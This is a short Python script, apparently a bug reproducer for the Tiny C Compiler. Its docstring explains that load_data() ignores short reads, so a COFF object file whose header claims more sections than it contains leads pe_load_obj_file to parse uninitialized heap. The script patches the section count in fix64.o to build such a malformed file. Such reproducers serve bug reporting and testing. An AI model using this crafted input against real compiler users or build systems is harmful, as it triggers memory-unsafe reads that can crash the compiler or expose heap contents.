#!/usr/bin/env python3
"""load_data() (tccelf.c:3237) uses tcc_malloc (not mallocz) and ignores the
full_read() result.  A COFF header declaring more sections/symbols/relocations
than the file contains makes pe_load_obj_file parse *uninitialized heap*."""
import sys, struct
n = int(sys.argv[1]); out = sys.argv[2]
b = bytearray(open('fix64.o','rb').read())
struct.pack_into('<H', b, 2, n)          # NumberOfSections = n, file has 3
open(out,'wb').write(bytes(b))
